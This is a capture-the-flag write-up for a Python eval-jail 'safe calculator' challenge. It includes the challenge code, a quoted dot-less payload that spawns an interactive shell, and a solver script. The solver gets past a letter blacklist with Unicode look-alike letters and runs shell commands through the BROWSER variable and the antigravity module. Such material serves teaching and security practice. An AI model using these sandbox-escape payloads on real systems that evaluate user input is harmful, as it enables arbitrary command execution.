#### Challenge:


---

#### Solution:

This is similar to the `My First Calculator` (BTW there is no second, I checked), but the functions we can use are significantly constrained:

```python
import sys

print("This is a safe calculator")

inp = input("Formula: ")

sys.stdin.close()

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."

if any(x in inp for x in blacklist):
    print("Nice try")
    exit()

fns = {
    "__builtins__": {
        "setattr": setattr,
        "__import__": __import__,
        "chr": chr
    }
}

print(eval(inp, fns, fns))

```

Basically we can only use `chr`, `__import__`, and `setattr`. So I kissed goodbye to the eval wrap from previous task and started to try lots of shenaningans. Basically I saw two possible routes, either to try to restore the `__builtins__` somehow to get to `eval()` to get to dot again (but that seemed impossible without the dot) or break out directly, but that was hard because not all python constructs work with UTF-8.

For example I wanted to use this beautiful dot-less payload from `angstrom-23` that imports `code` module to get to `lambda`, which can then run interactive python shell:

```python
## This expression spawns interactive python shell:
(__builtins__:=__import__('code'))==(lambda:interact())()

### In there run this to get flag:
__import__("os").system("cat flag*")
```

But this was foiled by the fact that `lambda` keyword did not work in UTF-8.

Scavenging through the net I came across this [video](https://youtu.be/-ya0149Hdgs?t=861) where a guy explains this python easter egg - `antigravity` module. Running `import antigravity` in python terminal opens a browser page with [xkcd comic](https://xkcd.com/353/). Basically its import statement that works similar to `eval()`! With that it was fairly easy to construct a dot-less payload with only provided functions and get the flag.

```python
#!/usr/bin/python

import string

## Mathematical bold script letters
mat_b_letters = ''.join([chr(x) for x in range(0x1D4D0, 0x1D503 + 1)])
ascii_letters = string.ascii_uppercase + string.ascii_lowercase
trans_table   = ascii_letters.maketrans(ascii_letters, mat_b_letters)

def encode_str(str):
    encoded_str = ""
    for x in str:
        encoded_str = encoded_str + f"chr({ord(x)})+"
    encoded_str = encoded_str[:-1]
    return encoded_str

## text = '__import__('antigravity'), setattr(__import__('os'), 'environ', {'BROWSER':'/bin/sh -c "cat flag*"'}))'
text = '__import__('+encode_str('antigravity')+', setattr(__import__('+encode_str('os')+'), '+encode_str('environ')+', {'+encode_str('BROWSER')+':'+encode_str('/bin/sh -c "cat flag*" #%s')+'}))'

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
utf_text = ""
for x in text:
    if x in blacklist:
        utf_text = utf_text + x.translate(trans_table)
    else:
        utf_text = utf_text + x

print(utf_text)

## To test run:
# sudo docker build -t calc3 .
# sudo docker run -p 1337:1337 calc3
# python3 calc3.py | nc 127.0.0.1 1337

```

---

<details><summary>FLAG:</summary>

```
TFCCTF{60c7502daf7f94106a295d7dea14b63df2048f8d}
```

</details>
<br/>
